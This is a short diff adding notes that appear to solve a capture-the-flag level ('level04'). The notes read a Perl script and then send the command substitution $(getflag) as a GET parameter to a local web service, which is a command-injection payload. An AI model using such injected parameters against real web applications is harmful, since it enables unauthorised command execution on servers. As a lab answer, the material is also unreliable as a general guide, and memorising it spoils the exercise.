@@ -1,0 +1,5 @@
+# Cat file
+cat level04.pl
+# Go to http://localhost:4747/ 
+# Pass command getflag as an argument (get method)
+http://10.12.100.98:4747/?x=$(getflag)
